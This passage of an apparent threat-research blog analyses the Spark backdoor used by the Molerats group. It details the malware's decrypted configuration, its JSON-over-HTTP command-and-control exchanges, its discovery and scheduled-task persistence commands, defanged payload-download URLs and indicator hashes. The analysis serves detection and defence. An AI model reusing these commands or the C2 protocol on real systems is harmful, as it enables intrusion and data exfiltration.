28th bytes of the resulting hash as the final key. The payload will base64 decode the ciphertext and use the final key to decrypt the decoded ciphertext using Triple DES (3DES), which results in a configuration that is structured in JSON. This particular payload had the keys and values seen in Table 3 below.\r\n\r\n\r\n\r\nJSON Field\r\nJSON Value\r\nDescription\r\n\r\n\r\nxBql\r\nlaceibagrafica[.]com\r\nHostname of C2 server\r\n\r\n\r\neauy\r\n\/\r\nURI of C2 server\r\n\r\n\r\nQnd\r\n80\r\nTCP port for C2 server\r\n\r\n\r\njJN\r\n0\r\nSleep interval before entering the main C2 communications loop.\r\n\r\n\r\nrlOa\r\n&lt;empty string&gt;\r\nUnknown and does not appear to be used.\r\n\r\n\r\nEb\r\n1\r\nUnknown purpose, but sent to the C2 in the BrandentlK field\r\n\r\n\r\nBGa\r\nvcJbq6nzgJk=\r\nHardcoded base64 encrypted string, which is the \u201cNickname\u201d field likely used as a campaign identifier\r\n\r\n\r\nqJk\r\n10000\r\nNumber of iterations of the main C2 communications loop before exiting the application.\r\n\r\n\r\n\r\nTable 3. JSON key\/value pairs within the payload\u2019s configuration\r\nThe payload also uses this same routine to decrypt an encrypted buffer that contains sleep intervals and more importantly a list of first names used to structure the messages sent to and from the C2 server, as well as the keys used to decrypt these messages. The payload will use the first names listed in Table 4 as JSON key names and values within messages sent to and received from the C2. We provide a description of each element of this decrypted buffer in the Appendix, but also show how the names in Table 4 are used within the C2 communications later in this blog. Each of the values in Table 4 are unique per Spark sample, as the developer changes the names and the keys for each payload.\r\n\r\n\r\n\r\nLawrence\r\nAlanih\r\nNevaeh\r\nGarrison\r\nReeceWNM\r\n\r\n\r\nAllier\r\nAverizt\r\nLondonzO\r\nZeke\r\nMorganE\r\n\r\n\r\nJaseN\r\nMathiasNbo\r\nJoslynKe\r\nReesefP\r\nWinston\r\n\r\n\r\nIvory\r\nBrandentlK\r\nAngelxEv\r\nFrederickT\r\nJessicay\r\n\r\n\r\nJonas\r\nAdalynngS\r\nZaydenlnL\r\nKaileeXws\r\nVanessaFM\r\n\r\n\r\nReginacy\r\nAdelineRD\r\nHoustonod\r\nEverlyY\r\nJordanlzw\r\n\r\n\r\nTrumanRd\r\nCollinsPM\r\nMaximiliano\r\nCallieVK\r\nAryana\r\n\r\n\r\n\r\nTable 4. First names used by Spark as JSON key\/value pairs used for C2 communications\r\nBefore communicating with the C2 server, the payload will decrypt one more buffer that contains strings that the payload uses for debugging messages, as well as the commands it will use to gather system information. Table 5 shows the strings decrypted and their purpose.\r\n\r\n\r\n\r\nDecrypted String\r\nDescription\r\n\r\n\r\n1\r\nUnknown purpose, but sent to the C2 in the Averizt field\r\n\r\n\r\n311OEVZihfReZStoFf4cfg==\r\nDecodes and decrypts to \/c hostname used to obtain the hostname of the system\r\n\r\n\r\nZ9Q1WVryAIzLVSxF1yWRwg==\r\nDecodes and decrypts to %COMSPEC% to get the location of cmd.exe to run commands to gather system information\r\n\r\n\r\nP5K5He\/2wSGGsvrFPKYpwg4KjBLyTOpbsGJwm1DckoyGK8eXeNMZCQBfHzkYRSjJlGcw6Ckn41X0MY3zJcU65uMvxpABv\/g+ttABRJsG7js=\r\nDecodes and decrypts to \/c wmic csproduct get UUID | more +1 | cmd \/q \/v:on \/c \"set\/p .=&amp;echo(!.!\" used to obtain the UUID of the system\r\n\r\n\r\nAykC+x26hhd5DfrB\/yly9gXcFsIlVxO9\r\nDecodes and decrypts to \/c echo %username% used to obtain the username of the logged in account\r\n\r\n\r\nok\r\nGeneric message to indicate a successful execution of a command\r\n\r\n\r\nCreate Pipe Error\r\nDebug message sent to the C2 if the payload fails to create a pipe to get the results of a command\r\n\r\n\r\nCreate processa error\r\nDebug message sent to the C2 if the payload fails when creating the process for a command\r\n\r\n\r\nGet exit code process error\r\nDebug message sent to the C2 if the payload fails when calling GetExitCodeProcess to get the error message when attempting to create the process for a command\r\n\r\n\r\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_+\r\nUnknown, as it does not appear to be used in the code\r\n\r\n\r\nSet handle information error\r\nDebug message sent to the C2 if the payload fails when calling SetHandleInformation when attempting to set the stdout of created process to inherit the object handle\r\n\r\n\r\nWait for single object error\r\nDebug message sent to the C2 if the payload fails when calling WaitForSingleObject after attempting to create the process for a command\r\n\r\n\r\n\r\nTable 5. JSON key\/value pairs within a buffer that the payload uses to communicate with C2 server\r\n\r\nSpark C2 Communications\r\nThe payload communicates with its C2 server laceibagrafica[.]com by issuing HTTP POST requests with base64 encoded and encrypted messages in the data section. We had not seen any previous explanation of this C2 channel, so we will provide an overview of the back and forth communications between the payload and C2 server to show how this payload uses the names in Table 4. To do this analysis, we created a C2 server to interact with the Spark payload to issue commands, so all of the HTTP responses in this section are from the C2 server we created and not an actor developed C2 software. Figure 6 shows an initial beacon sent from the payload to its C2 server. However, all of the outbound requests from the payload to the C2 will look similar visually, as they all use HTTP POST requests to the same URL with encoded and encrypted messages.\r\n\r\n[caption id=\"attachment_105145\" align=\"aligncenter\" width=\"1408\"] Figure 6.Initial beacon sent from payload to C2 server[\/caption]\r\n\r\nThe data section in the initial beacon decodes and decrypts to the JSON message {\"CallieVK\":\"W10=\",\"ReeceWNM\":\"Jessicay\"}. The JSON message involves two key\/value pairs with keys \u201cReeceWNM\u201d and \u201cCallieVK\u201d, whose values transmit the communication type and the data, respectfully. For instance, the \u201cReeceWNM\u201d key includes the name \u201cJessicay\u201d that is used to represent the initial beacon communication type. The payload will decrypt the C2 servers\u2019 response looking for a \u201cEverlyY\u201d field and uses the value for a sleep interval before continuing. Figure 7 shows a response from the C2 server to the initial beacon, of which the response decrypts to {\"EverlyY\": 0}.\r\n\r\n[caption id=\"attachment_105147\" align=\"aligncenter\" width=\"708\"] Figure 7. Initial beacon sent from payload to C2 server[\/caption]\r\n\r\nAfter receiving the EverlyY response, the payload will gather system information, specifically the username, hostname and the system specific UUID by running the following command line commands using \u2018cmd.exe\u2019:\r\n\r\n \twmic csproduct get UUID | more +1 | cmd \/q \/v:on \/c \"set\/p .=&amp;echo(!.!\"\r\n \thostname\r\n \techo %username%\r\n\r\nThe payload will store each of these command results in JSON in base64 encoded ciphertext within a field name \u201cZaydenlnL\u201d and using the first name \u201cAngelxEv\u201d to represent the type of data, which is a number that corresponds to the results in the list above with 1 representing the UUID, 2 the hostname and 3 the username. These three JSON objects are added to a JSON array with a name of \u201cMaximiliano\u201d and sent to the C2 server. For example, the payload stores the system information in JSON as follows:\r\n\r\n{\"Maximiliano\":[{\"AngelxEv\":1,\"Houstonod\":1,\"ZaydenlnL\":\"&lt;base64 encoded ciphertext of UUID&gt;\"},{\"AngelxEv\":3,\"Houstonod\":1,\"ZaydenlnL\":\"&lt;base64 encoded ciphertext of username&gt;\"},{\"AngelxEv\":2,\"Houstonod\":1,\"ZaydenlnL\":\"&lt;base64 encoded ciphertext of hostname&gt;\"}]}\r\n\r\nThe payload will create an outbound communications JSON object by setting the encoded system information JSON to the \u201cCallieVK\u201d value and setting the \u201cReeceWNM\u201d value to the communication type \u201cJoslynKe\u201d. The resulting JSON will resemble the following:\r\n\r\n{\"CallieVK\":\"&lt;base64 encoded ciphertext of system information \u201cMaximiliano\u201d JSON array&gt;\",\"ReeceWNM\":\"JoslynKe\"}\r\n\r\nThe resulting JSON object is base64 encoded, encrypted and sent within the HTTP POST data to the C2 server, as seen in the example request in Figure 8.\r\n\r\n[caption id=\"attachment_105149\" align=\"aligncenter\" width=\"1576\"] Figure 8. System information sent from payload to C2 server[\/caption]\r\n\r\nAfter sending the system information, the payload will expect to receive a command from the C2 server within the response. Figure 9 shows the response to this request that contains encrypted data that the payload will parse for commands to execute.\r\n\r\n[caption id=\"attachment_105151\" align=\"aligncenter\" width=\"1584\"] Figure 9. C2 server response containing ciphertext containing a command line command to execute[\/caption]\r\n\r\nThe payload does not have a command handler. Rather, it will process the JSON object within the C2\u2019s response for applications to open and\/or command line commands to run by calling the CreateProcessW API function. The expected JSON object contains an array named \u201cJordanlzw\u201d that has one or more objects that will have a task identifier number in a field \u201cIvory\u201d, an application name to run in a \u201cAlanih\u201d field, and the command line arguments to pass to the application in a \u201cTrumanRd\u201d field. For instance, the decrypted response in Figure 9 contains a JSON object would instruct the payload to run \u201cc:\\windows\\system32\\cmd.exe\u201d using the command line argument \u201c\/c whoami\u201d, which effectively runs the \u201cwhoami\u201d command:\r\n\r\n{\"Aryana\": 0, \"Jordanlzw\" :[{\"Ivory\" : 5, \"Jonas\" : true, \"Reginacy\" : false, \"TrumanRd\" : \"\/NKg0zJdCDP1XlK9NJ4eJA==\", \"Alanih\" : \"i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=\", \"LondonzO\" : true}]}\r\n\r\nAfter running the command provided by the C2, the payload will send a message to the C2 server that we believe is meant to notify the C2 that it received the command by sending the specific task identifier to the server. The payload will notify the C2 using the communication type \"MorganE\" as seen in the following JSON:\r\n\r\n{\"CallieVK\":\"eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=\",\"ReeceWNM\":\"MorganE\"}\r\n\r\nThe decoded data within the \u201cCallieVK\u201d field will contain a JSON array with a name of \u201cJaseN\u201d that contains one or more objects with a field name of \u201cLawrence\u201d that contains the task numbers received, such as {\"JaseN\":[{\"Lawrence\":5}]}. This acknowledgement is sent to the C2 server, as seen in Figure 10:\r\n\r\n[caption id=\"attachment_105153\" align=\"aligncenter\" width=\"1396\"] Figure 10. Payload notifying the C2 server that it received the command[\/caption]\r\n\r\nAfter acknowledging the receipt of command, the payload expects the C2 to respond with a JSON object with the \u201cAllier\u201d field set to a number, such as {\"Allier\" : 7}. We are unsure of the purpose of this transmission or how the payload uses this number value, but Figure 11 shows the base64 encoded ciphertext containing the \u201cAllier\u201d field.\r\n\r\n[caption id=\"attachment_105155\" align=\"aligncenter\" width=\"670\"] Figure 11 C2 server providing the Allier JSON object[\/caption]\r\n\r\nAfter receiving the \u201cAllier\u201d JSON object, the payload will send the results of the executed command(s) to the C2 server. The payload will create a JSON object with an array named \u201cZeke\u201d, which will contain JSON objects that have a \u201cFrederickT\u201d field used to store the result of the command, a \u201cReesefP\u201d field to denote the task identifier, and a \u201cKaileeXws\u201d field to store a boolean if the command was successful. The resulting JSON would look like the following when the result of the \u2018whoami\u2019 command issued by the C2 is \u201ctest-system\\&lt;redacted&gt;\u201d:\r\n\r\n{\"Zeke\":[{\"FrederickT\":\"5yUu16Ae8WKt&lt;redacted&gt;\",\"KaileeXws\":true,\"ReesefP\":5}]}\r\n\r\nThe payload will base64 encode this data and set the \u201cCallieVK\u201d field in the outbound JSON object with the \u201cReeceWNM\u201d field set to the \u201cWinston\u201d communication type, as seen in the following:\r\n\r\n{\"CallieVK\":\"eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX&lt;redacted&gt;0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=\",\"ReeceWNM\":\"Winston\"}\r\n\r\nThe payload will then encrypt this JSON object and send it to the C2 server to exfiltrate the results of the issued command. Figure 12 shows the HTTP POST request containing the encrypted JSON object that contains the \u201cWinston\u201d communication type.\r\n\r\n[caption id=\"attachment_105157\" align=\"aligncenter\" width=\"1302\"] Figure 12. Payload sending the results of the issued command to the C2 server[\/caption]\r\n\r\nAfter sending the results of the initial commands, the payload expects the C2 to reply with a JSON object with a \u201cGarrison\u201d field set to a number, such as \u201c{\"Garrison\" : 8}\u201d. Figure 13 shows the C2 server responding with ciphertext of the JSON object with the \u201cGarrison\u201d field.\r\n\r\n[caption id=\"attachment_105159\" align=\"aligncenter\" width=\"718\"] Figure 13. C2 server sending the Garrison JSON object to the payload[\/caption]\r\n\r\nThis concludes the check-in and initial command execution portion of the C2. The payload will enter a loop to continuously send HTTP requests to obtain additional commands to run using the same sequence of JSON objects previously explained starting after the \u201cJoslynKe\u201d communication type that sent the system information to the C2. Instead of sending the system information to the C2 and parsing the response for a command, each iteration of this loop will start with a communication type of \u201cVanessaFM\u201d as seen here:\r\n\r\n{\"CallieVK\":\"eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm5nUyI6MSwiQ29sbGluc1BNIjoiS1Q2TloyMVNGTVQ5WHFuZVM3MjJmZkVucG1FUFVZcDBqcDFFTXRaVEtyUmNNWkVFWG56QnZnPT0iLCJOZXZhZWgiOnRydWV9XX0=\",\"ReeceWNM\":\"VanessaFM\"}\r\n\r\nThe data in the \u201cCallieVK\u201d field decodes to a JSON object that has several fields, one of which is an array called \u201cMathiasNbo\u201d that contains JSON objects that transmit the UUID for the compromised system in a field named \u201cCollinsPM\u201d that was previously transmitted to the C2 in the \u201cZaydenlnL\u201d field of the \u201cJoslynKe\u201d communication type. The JSON object also contains a field \u201cAdelineRD\u201d that contains a nickname or campaign identifier value in the form of base64 encoded ciphertext. We have compiled a list of campaign codes of known Spark payloads, which we have included in the Appendix. The resulting JSON object will look like the following:\r\n\r\n{\"AdelineRD\":\"vcJbq6nzgJk=\",\"Averizt\":\"1\",\"BrandentlK\":1,\"MathiasNbo\":[{\"AdalynngS\":1,\"CollinsPM\":\"\"&lt;base64 encoded ciphertext of UUID seen in ZaydenlnL field&gt;\",\"Nevaeh\":true}]}\r\n\r\nThis JSON is encrypted and base64 encoded and sent to the C2 server, as seen in Figure 14. The payload will use the same JSON each iteration of the main loop and will expect the C2 to provide the same sequence of responses as discussed before that contain \u201cJordanlzw\u201d, \u201cAllier\u201d, and \u201cGarrison\u201d fields to receive additional commands.\r\n\r\n[caption id=\"attachment_105161\" align=\"aligncenter\" width=\"1510\"] Figure 14. Payload issuing HTTP POST to C2 server requesting further commands[\/caption]\r\nComparison between 2019 and 2020 campaigns\r\nWhile collecting additional Spark samples, we found samples from a 2019 campaign and newer samples that were compiled in January 2020 used in the Spark Campaign. The delivery documents and Spark payloads used in these campaigns differ from the delivery document we observed in the October and November 2019 attacks. At a high level, the January 2019 delivery document was self-contained as it had its payload embedded within it, while the October 2019, November 2019 and January 2020 delivery documents required interacting with a remote server. The October 2019 and January 2020 documents differ as the former attempts to download a VBScript that downloads a payload from the actor controlled server, whereas the January 2020 document attempts to load a remote template from Google Drive whose macro attempts to download a payload from Google Drive. The known Spark payloads installed by each of these delivery documents differ as well, which we will compare with the known payload from the November attack discussed earlier in this blog.\r\n\r\nWe analyzed a delivery document from the 2019 campaign and found that it was a macro-enabled Word document (SHA256:40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11). The macro made the decoy contents by setting a textbox in the document to visible with the line \u201cShapes(\"textbox1\").Visible = True\u201d, while the attacks discussed earlier in this blog did not attempt to display any updated decoy contents. Another marked difference is that while both the January and October 2019 delivery documents wrote to a secondary VBScript %userprofile%\\wmsetup.vbs and programdata\\Micorsoft\\Microsoft.vbs respectively, the wmsetup.vbs script contains the binary payload while Microsoft.vbs attempts to download another VBScript that will download the binary payload. The wmsetup.vbs script decodes an embedded base64 encoded payload (SHA256:9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db\r\n\r\n), saves it to %temp%\\ihelp.exe and creates a scheduled task for persistence by running the following command:\r\n\r\nschtasks \/create \/f \/sc minute \/mo 1 \/tn ihelp \/tr %temp%\\ihelp.exe\r\n\r\nA few notable characteristics of the Spark payload delivered in January 2019 include the use of different freely-available libraries from other known samples, such as using the msgpackv1 library instead of JSON to structure its configuration and C2 communications, as well as using the SFML library instead of cURL. Also, unlike the Spark payload delivered in November 2019, this payload uses the AES cipher to decrypt its configuration and other pertinent strings and to encrypt and decrypt network communications with its C2. It uses the entire SHA256 hash of a supplied key string without using the custom rolling XOR cipher on the key and ciphertext as discussed earlier in this blog. The decrypted configuration from this payload structured using msgpack appears as follows:\r\n\r\n\\x88\\xa4jevG\\xadsmartweb9[.]com\\xa3JRk\\xa1\/\\xa3ufRP\\xa4qNxp\\x00\\xa4kfds\\xa0\\xa4WjaS\\x01\\xa3WnF\\xb8OMfX5GiCmOICUvhunB2lWQ==\\xa3sRF\\xcd'\\x10\r\n\r\nWe also analyzed a delivery document from the 2020 Spark campaign (SHA256:8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8) and it differed from both the January and October 2019 delivery documents. First, the initial delivery document did not contain a macro, rather it attempts to load a remote template from Google Drive, specifically at the following URL:\r\n\r\nhxxps:\/\/drive.google.com\/uc?export=download&amp;d=1NbCEnL-jA89PWBEhLWwHmBM5nmUKNRS8\r\n\r\nThe remote template (SHA256:a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367) contains a macro that attempts to download an executable from the following URL:\r\n\r\nhxxs:\/\/drive.google.com\/uc?export=download&amp;id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH\r\n\r\nThe executable hosted at the Google Drive link (SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128) is a compiled AutoIt script that attempts to install a Spark backdoor to %userprofile%\\runawy.exe, which is the same exact dropper and payload as we observed installed by the \u201cattachment.doc\u201d delivery document discussed earlier in this blog.\r\n\r\nTable 6 shows a comparison of features in the Spark payloads discussed in this section. Unfortunately, we were unable to obtain the payload installed by the MOFA-related Word documents delivered in the October 2019 attacks. If we compare the Spark samples installed by the delivery documents in January 2019 and 2020 with the Spark sample installed by the Pictures.pdf delivery document in November 2019, we see notable differences that suggest this threat group is continually developing this backdoor.\r\n\r\n\r\n\r\nFeature\r\nJan. 2019 Spark\r\nNov. 2019 Spark (Pictures.pdf)\r\nOct. and Nov. 2019 \u201cattachment.doc\u201d and Jan. 2020 \u201cThe Spark Campaign\u201d\r\n\r\n\r\nDropper\r\nNone\r\nCompiled AutoIt script\r\nCompiled AutoIt script\r\n\r\n\r\nHTTP Library\r\nSFML\r\ncURL 7.56.0-DEV\r\nelnormous' HTTPRequest\r\n\r\n\r\nConfiguration Structure\r\nmsgpack version 1\r\nJSON for Modern C++ v2.1.1\r\nJSON for Modern C++ v3.7.0\r\n\r\n\r\nPayload Packer\r\nEnigma Virtual Box\r\nEnigma (5.X)\r\nEnigma (5.X)\r\n\r\n\r\nCipher used\r\nAES on ciphertext\r\nRolling XOR on key and ciphertext + 3DES on ciphertext\r\nRolling XOR on key and ciphertext + custom AES decrypting 16-byte chunks of ciphertext\r\n\r\n\r\nEncrypted data\r\nConfiguration, Names for C2 comms, Commands to gather system information\r\nConfiguration, Names for C2 comms, Commands to gather system information\r\nConfiguration, Names for C2 comms\r\n\r\n\r\nPersistence\r\nScheduled task\r\nLNK Shortcut in @StartupDir\r\nScheduled task, Copied executable in @StartupDir\r\n\r\n\r\n\r\nTable 6. Comparison of Spark payloads delivered in January 2019, October 2019, November 2019 and January 2020\r\n\r\nConnection to Downeks\r\nKaspersky\u2019s report mentioned the sub-groups of Molerats (AKA the Gaza Cybergang) are responsible for the Operation Parliament campaign that delivered the Spark payload and we observed this threat group delivering the Downeks in the DustySky campaign. We observed some similarities between Spark and Downeks from a development and installation perspective.\r\n\r\nFor instance, we observed the same binder Trojan, which is a malicious application used to open a decoy document and to install a payload, one installing a Downeks payload and two others installing Spark. The binder Trojan installing Downeks was compiled in December 2015 and was used during the DustySky campaign as mentioned in our blog (SHA256: 75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9), while we have two samples of this binder Trojan installing Spark samples that were compiled in November 2017 (SHA256:4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85) and April 2018 (SHA256:23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c).\r\n\r\nFrom a development perspective, both the Downeks and Spark payloads use libraries and code from several open-source projects available on GitHub to carry out its C2 communications and to structure data in JSON. First, Spark uses the cURL library for C2 communications, specifically version 7.56.0-DEV whose source code is available on GitHub, while Downeks (SHA256:9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7) used cURL to communicate with the C2 server, but an earlier version (7.39.0). Second, the payload uses JSON to parse its configuration and to structure its messages sent to and from the C2 server, which it uses JSON for Modern C++ Version 2.1.1 also available on GitHub. The previously mentioned Downeks also used JSON to parse its configuration and to structure the data it sends and receives from its C2 server. However, it used Tencent\u2019s RapidJSON again freely available on GitHub. This fits our previous observations of the developer of Spark using different JSON libraries within different versions of Spark.\r\nConclusion\r\nMolerats, also known as the Gaza Hacking Team and the Gaza Cybergang, has been targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries between October 2019 through the beginning of December 2019. This group uses spear-phishing emails to deliver both malicious Word and PDF documents, and attempts to social engineer the victim into an infection rather than trying to exploit a software vulnerability. Also, the group uses the Spark backdoor in attacks, but continues to develop this tool using different freely available libraries to structure important data and to carry out C2 communications.\r\n\r\nPalo Alto Networks customers are protected from the attacks discussed in this blog by:\r\n\r\n \tAll known Spark payloads and delivery documents have malicious verdicts in WildFire\r\n \tAll known Spark C2 domains and domains used in the delivery are marked with malicious classifications and verdicts in PANDB and DNS Security\r\n \tAutoFocus customers can track the delivery documents and payloads with the tags: Molerats_Spark\r\n\r\nAppendix\r\nIndicators of Compromise\r\nFiles related to MOFA documents\r\nd19104ef4f443e80c21375f1b779f00c960e0193e8aade69d7ad87a11f39c897 - MOFA- 031019.doc\r\ndc3311b3a827840c25689c0e153f2c09ba9583bcf18cdc43b88b12cf9846e94b - Microsoft.vbs\r\nc45b5b01e1c3284fd694db6aa0ebeab8abe78d9bb12eb41b957cd121d97b3516 - PlayerVLC.vbs\r\n03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506 - MOFA- 061019.doc\r\n725d907b33cca8cec22f561068a3a8abf3616a8e2f452adb7fbd4aec20390f06 - Microsoft.vbs\r\nFiles related to Attachment.doc\r\neaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000 - attachment.doc\r\n7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128 - rundll64.exe\r\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431 - runawy.exe\r\nFiles related to Pictures.pdf\r\n9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495 - Pictures.pdf\r\n1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da - Pictures.rar\r\n92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7 - \u0647\u0630\u0647 \u0639\u064a\u0646\u0629 \u0642\u0644\u064a\u0644\u0629 \u0645\u0646 \u0627\u0644\u0635\u0648\u0631.exe\r\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3 - pdf.exe\r\nRelated Spark payloads and Delivery documents\r\nee9f90819a578c8256fc950f62bd9f7b051edbee06618a26fa21c2875c3c301e - \u0627\u0644\u0645\u0630\u0643\u0631\u0629 \u0631\u0642\u0645 973 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u062d\u0643\u0648\u0645\u0629 \u0627\u0644\u062c (Note No. 973 Government List c)\r\n\r\n9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7 - GoogleChrome.vbs\r\n\r\nddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8 - MOFA- 101019.doc\r\n\r\n4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba - Microsoft.vbs\r\n\r\nfeec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21 - \u202e\u0627\u0644\u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u064a\u0648\u0645\u064a \u062d\u0648\u0644 \u0623\u0647\u0645 \u0627\u0644\u0645\u0633\u062a\u062c\u062f\u0627\u062a \u0627\u0644\u0641\u0644\u0633\u0637\u064a\u0646\u064a\u0629 \u0644\u064a\u0648\u0645\u202c\u202d - 9 - 9 - 2019.doc\u202c (Daily report on the most important Palestinian developments, 9-9-2019.doc)\r\n\r\nbf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959 - \u0627\u0644\u062a\u0642\u0631\u064a\u0631 \u0627\u0644\u064a\u0648\u0645\u064a \u062d\u0648\u0644 \u0623\u062e\u0631 \u0645\u0633\u062a\u062c\u062f\u0627\u062a \u0627\u0644\u0625\u0631\u0647\u0627\u0628 \u0627\u0644\u0639\u0627\u0644\u0645\u064a- 9 - 9 - 2019.doc (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc)\r\n\r\n243f1301d1d759c17cd49336512ebceb9d347995c90a6e00aff926439d63f12d - Daily Report.rar\r\n\r\n602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb\r\n\r\neaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000\r\n\r\n273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f\r\n\r\n71ea0ba573451b14bb411ad28e5aac883f8af0376db8c9d34f309778c901c5d6\r\n\r\na0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367\r\n\r\n8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8\r\n\r\n7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128\r\n\r\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431\r\n\r\ne8d73a94d8ff18c7791bf4547bc4ee2d3f62082c594d3c3cf7d640f7bbd15614\r\n\r\n6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296\r\n\r\nb08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca\r\n\r\na6e0297777ba29e21e5d1acca6210d436eee5c2b93d2dec27910ffd6e2266559\r\n\r\n6e896099a3ceb563f43f49a255672cfd14d88799f29617aa362ecd2128446a47\r\n\r\ncf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551\r\n\r\n92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7\r\n\r\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3\r\n\r\n89acce7cdd354a04f2edd4a2226caf5c47246a8196ec1d9b98159da38ec20c24\r\n\r\nb654dd768912e09b9c71eb388995b1d69b5baa45e970a6afc42733d647220712\r\n\r\ndaa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c\r\n\r\nc39e3adb6e15b9964bf0f9702b632086951b4ed9f9fb9cadd6975962a031a398\r\n\r\n255a29f88150285a9553f67a6475dc50fcbb5fc737a0178cc0e737d49c8d1b20\r\n\r\n4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85\r\n\r\n23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c\r\n\r\n75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9\r\n\r\n9a3ec0a8b2a88106fc537d9cae1989f6fba36bb43352a944d2031e7b2ab7673c\r\n\r\n89d7337ac102cd80316ad59a1dcfcc5c7849d0e7520f0f85e1781574423e38ea\r\n\r\n19ede61c865a3cdd59d3a5d1a79b7ce83ca7828a6b80a2f968d82b5b56a8603c\r\n\r\nf9df76f634586c698b967209d83834b98ff3d245d47d6993bfb27a0aa819d9b9\r\n\r\n704b19e0460a0fa7d952ba6feb5eadb9054895d1d753df72faf6f470446a0519\r\n\r\n194c236a3eed81f3180bdcc5bcbd29b782b1a0ef7962ceb1c4cb892a427563ff\r\n\r\nfc420a49b1e9e2200238a4846110c2e4e63bfe6d7088645f49ebb65718a70b7f\r\n\r\nbc9353adc58b983b080b61950fc6689ee340797458fc4fd8a1d6f492976aa0e2\r\n\r\n8c6dc796b35ef405c42c78e1011cc4a6df09315264d638271cb0674d044886cf\r\n\r\n9d49020debdc6ab63de249fd9289d51415395fc8b1e8a15a82f200bf90e674ee\r\n\r\n5b6e43d434148bfcf52fd441f64836ae35f4f0ed9d75bf9707f521bcbb7c0380\r\n\r\n3a32c81ec609a5466f050c09156f25b5561c691763f865ee437e95a246dcbbe1\r\n\r\nc3e23a42dc49b039828da6cef4ebb7226c85163651a69085ee7e1899aa804fed\r\n\r\n26b032a9b6a22047eb48f1fb1553827a5b85aa7229422d650fa1f37c48b3aeb1\r\n\r\n8e5bf597948ea6ad39f0030053978d1a14e1c3dbb4abf044a223e14544c73b7f\r\n\r\n1513032544512718d068b2f6e8b5087cae9fc446e40cd56c03ab7bbbe047add5\r\n\r\nd04276760d722c241e831dacee7cf9d63cb123ce7188d604df1c56c1197d7160\r\n\r\n83750372d4e8c043d6f916ec398303dc929b59e05b7f5a9dc5485e4530047f4a\r\n\r\n23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c\r\n\r\nbf4cdb277881754db2f44a014c08ce1857c9c0c47c6c1c8582782b5c887241e2\r\n\r\n58376e763ef0ca9dccad55e043794b5ec0b34c8c2a20604cff0b26f216e3c1e2\r\n\r\n399344aa609f17e558356709a398b4478e5c737c7cc843e3d111d33192c35e5a\r\n\r\n1c43f8f68f7b8e40828f9f74566860b25a5dfd9b7f8b7620d71644866e6cb19d\r\n\r\nab2335ba3abe97a02a3a2d1b063a08ae649406f88d4cf02d22d724e649b9e7be\r\n\r\na4c6aea61953d515d38d75ae7b3ef2a37bb26d1f838722f0a67624d6a728549e\r\n\r\n51c1e6ce3ff1f42734bfa19a7142b5154172232afc5528dad4c527df3a44c0c1\r\n\r\n